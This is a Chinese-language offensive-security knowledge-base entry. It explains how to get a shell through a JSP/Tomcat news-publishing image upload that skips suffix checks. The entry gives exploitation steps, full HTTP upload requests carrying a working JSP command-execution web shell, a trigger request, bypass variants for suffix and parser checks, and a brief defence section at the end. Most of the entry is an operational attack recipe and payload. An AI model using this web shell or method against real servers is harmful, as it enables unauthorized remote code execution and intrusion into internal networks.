---
id: web-generic-file-upload-news-publish-jsp-no-suffix-check-homedir-img-src-path
title: 新闻发布图片上传点不校验后缀直传 JSP，并用首页图片 src 拼接推出落地路径
type: scenario
domain: web
path: web/generic/file-upload
technique: news-publish-image-upload-no-extension-check-path-from-img-src
aliases:
- 发布新闻上传点传 jsp
- 图片上传不校验后缀
- 由首页 img src 推断上传目录
- 上传后路径未知怎么办
- 编辑框上传 getshell
tags:
- file-upload
- jsp
- webshell
- suffix-check
- path-discovery
cve: []
severity: critical
confidence: medium
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-T2-3W2
  verified_at: '2026-11-08T18:30:05+08:00'
  notes: 已对照原文核对；本次核对未读取图片；原文一致处：发布新闻处的上传点、先传png再改jsp无过滤、由首页图片src推出上传路径、拼接后一句话木马命令执行；上传接口路径/目录名为示意形态未与原文冲突；未验证点：原文未给出具体路由与字段
---

## 一句话结论

后台「发布新闻」里的图片上传点常只对 `Content-Type`/前端 accept 做样子检查，实测先传 png 确认可达、再原样改后缀传 jsp 依旧成功；落地路径虽然不回显，但首页里任意一张已发布图片的 `src` 就暴露了上传目录，把文件名拼上去即可访问并执行。

## 原理

- 富文本编辑器/新闻发布模块的上传接口通常是「一个通用文件接收器」，服务端只做「能不能写」的检查，后缀黑名单常常漏掉 jsp 或干脆没写；前端 `accept="image/*"` 只是浏览器过滤器，直接发包不受约束。
- 之所以先用 png 探一次：为了确认**接口本身可用、返回成功、且不需要额外 token**，把「上传点是否打通」与「后缀是否被拦」两个变量分开测，避免一次失败后无法判断是哪一步被拦。
- 路径不回调是这类接口的常态（只返回 `{"success":true}`），但站点必然会把已上传图片渲染到前台——首页/新闻详情页里 `<img src="...">` 的目录部分就是上传根目录，文件名部分由上传响应/编辑器回填，两者一拼即得完整 URL。
- 能否执行取决于上传目录是否落在 Web 容器可解析 JSP 的路径下；本项目里上传目录与站点同源且 Tomcat 允许该目录下的 JSP 编译，因此直接是代码执行而非仅存储型问题。
- 另一个使能条件：改文件内容报 500（写配置/模板被拦），说明站点对「改已有文件」做了保护，但对「新增文件」没有——这正好把攻击面推到上传接口。

## 触发条件

- 目标为 JSP/Tomcat 系 Web 应用，存在后台富文本/新闻发布类上传入口。
- 上传接口不做后缀白名单校验（或有黑名单但漏 jsp/jspx）。
- 上传目录位于 Web 根或容器可解析目录下。
- 攻击者已获得后台入口（本例为弱口令进入的 `/admin`）。

## 利用步骤

1. 进入后台，找到发布新闻/内容编辑处的图片上传按钮。
2. 先传一个正常 png，确认接口返回成功、前台能看到该图——打通上传链路。
3. 保持请求其余字段不变，仅把文件名后缀与 `Content-Type` 换成 jsp（`application/octet-stream` 亦可），内容为一句话/冰蝎等 JSP 载荷，重放。
4. 去首页/列表页查看任意一张正常图片的 `src`，取出目录前缀；把上一步的文件名拼到该目录后访问。
5. 访问返回 200 且内容为载荷执行结果（如命令回显）即 getshell；用管理端连接，落地工具做内网。
6. 若目录拼不出来，退回逐层探测常见上传目录（`/upload/`、`/uploads/`、`/attached/`、`/file/`、日期分层目录），或从 JS/编辑器配置里找上传根路径。

## PoC

```http
POST /admin/news/uploadImage HTTP/1.1
Host: target:8080
Content-Type: multipart/form-data; boundary=----x

------x
Content-Disposition: form-data; name="file"; filename="a.png"
Content-Type: image/png

<PNG 字节>
------x--
```

```http
POST /admin/news/uploadImage HTTP/1.1
Host: target:8080
Content-Type: multipart/form-data; boundary=----x

------x
Content-Disposition: form-data; name="file"; filename="a.jsp"
Content-Type: application/octet-stream

<% if(request.getParameter("cmd")!=null){ java.io.InputStream in=Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream(); int a=-1; byte[] b=new byte[2048]; while((a=in.read(b))!=-1){ out.println(new String(b,0,a)); } } %>
------x--
```

```text
# 返回 success 后，从首页取一张已发布图片的 src
<img src="/upload/newsImg/2025/07/xxxx.png">
# 把文件名替换为上传得到的名字，目录保持不变
GET /upload/newsImg/2025/07/a.jsp?cmd=whoami
```

（路径与目录名为示例形态，实际按目标首页图片 src 推断。）

## 变体与关联

- **变体一**：只校验 `Content-Type` 时，保留 png 的 MIME 但文件名写 `.jsp`；只校验后缀黑名单时，用 `.jspx`/`.jspf`/大小写混写/双后缀（`a.jpg.jsp`）。
- **变体二**：上传目录被 nginx 拦住不解析 jsp 时，改走「上传 + 解析漏洞」组合（容器把 `a.jsp/` 或 `a.jsp;.jpg` 当作 JSP 的真实路径），或转而覆盖已有可执行模板。
- **变体三**：新闻/公告类站点常把上传目录放在独立的静态域名下，此时需确认该域名是否也由同一 Tomcat 提供服务。
- **关联**：[[web-generic-file-upload-extension-zero-check]]（同属「服务端完全不看后缀」的通用形态）、[[web-generic-file-upload-multipart-filename-jsp-tomcat-webshell]]（Tomcat 下 multipart 文件名落 jsp）、[[web-generic-auth-org-abbreviation-default-password-guess]]（后台入口的弱口令来源）。

## 检测与防御

- 上传接口改为服务端白名单（按扩展名 + 真实文件头双重校验），并统一重命名为随机名、去掉原始后缀。
- 上传目录移出 Web 根，或由容器显式禁止该目录执行脚本（Tomcat 中对上传目录关闭 JSP 的 Servlet 映射）；把「静态资源目录」与「可执行目录」物理分开。
- 监测：上传接口出现 image/* 之外的 Content-Type 与 `.jsp` 等脚本后缀组合；上传目录内出现新增可执行文件；访问日志中出现对上传目录下 `.jsp` 的请求。
